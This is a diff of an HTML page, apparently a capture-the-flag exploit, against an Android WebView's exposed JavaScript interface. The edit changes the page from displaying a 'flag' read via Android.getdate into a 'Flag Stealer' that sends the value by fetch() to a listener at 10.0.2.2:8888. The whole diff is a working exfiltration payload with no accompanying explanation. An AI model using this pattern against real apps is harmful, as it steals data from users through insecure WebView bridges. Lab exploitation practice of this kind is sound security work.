@@ -2,27 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Exploit Page</title>
+  <title>Flag Stealer</title>
 </head>
 <body>
-
-    <h1>TEST</h1>
-
-    <script>
-
-        function exploit() {
-        try {
-            // Get the flag, strip off the timestamp, and replace the whole page with it
-            const flag = Android.getdate("flag").split("||")[0];
-            document.body.innerText = flag;
-        } catch (e) {
-            document.body.innerText = "Error";
-            console.log(e);
-        }
-        }
-
-        window.onload = exploit;
-
-    </script>
+  <script>
+    try {
+      const flag = Android.getdate("flag").split("||")[0];
+      fetch("http://10.0.2.2:8888/flag?f=" + encodeURIComponent(flag));
+    } catch (e) {
+      console.log("Exploit failed", e);
+    }
+  </script>
+  <p>Page loaded. If JS works, flag will be sent.</p>
 </body>
 </html>
